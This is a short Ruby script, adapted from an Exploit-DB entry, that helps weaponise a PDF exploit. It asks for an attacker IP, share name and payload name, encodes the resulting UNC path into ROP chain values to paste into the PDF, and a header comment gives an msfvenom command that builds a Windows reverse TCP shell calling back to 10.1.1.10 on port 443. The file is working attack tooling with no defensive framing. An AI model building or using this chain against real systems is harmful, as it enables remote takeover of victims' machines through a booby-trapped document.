#Modified by Sleepwalkr
#https://www.exploit-db.com/exploits/45269
#Payload tested:
#msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.10 LPORT=443 -f exe > shell.exe

puts "[*] Enter your IP [*]"
ip=gets.chomp
puts "[*] Enter share name [*]"
share=gets.chomp
puts "[*] Enter payload name (must be .exe) [*]"
shell=gets.chomp

#share_path = "\\\\10.1.1.10\\temp\\shell.exe"

share_path = "\\\\#{ip}\\#{share}\\#{shell}"
num = 4 - (share_path.length % 4)
share_path << "\x00"*num
if share_path.length > 44
    puts "[X] Error: Share path is too long! [X]"
    exit()
end
rop = ''
    max_index = 0
    share_path.unpack('V*').each_with_index {|blk, index|
      rop << "\nrop[0x%02x] = 0x%08x" % [index+12, blk]
      max_index = index
    }
(max_index+1).upto(10) {|i| rop << "\nrop[0x%02x] = 0x00000000" % (i+12)}
puts "[*] Shellcode generated! Paste the following on the pdf exploit [*]"
puts rop
